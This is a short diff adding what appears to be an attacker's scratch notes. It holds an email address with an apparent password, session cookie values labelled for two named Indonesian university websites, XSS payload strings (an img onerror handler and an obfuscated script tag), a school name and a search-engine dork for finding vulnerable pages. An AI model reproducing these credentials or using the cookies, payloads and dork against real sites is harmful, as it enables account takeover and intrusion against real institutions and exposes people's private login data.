@@ -1,0 +1,20 @@
+naufalfairuzalll@gmail.com
+67?aWJ5fc48osHY624;EEa[os8X563Bq
+
+
+
+
+cookie sisfo.uhn.ac.id
+PHPSESSID=8af4a15be56bfb3286a4a790955f5d8f
+
+payload 
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
+<script\x3Etype="text/javascript">sandihacker</script>
+
+cookie info nurulfikri.ac.id
+cmn0aa7u7lu5cldrb6sf9mbml5
+
+SMKN 2 PADANG 
+
+Dork xss 
+inurl:php?mnux= 
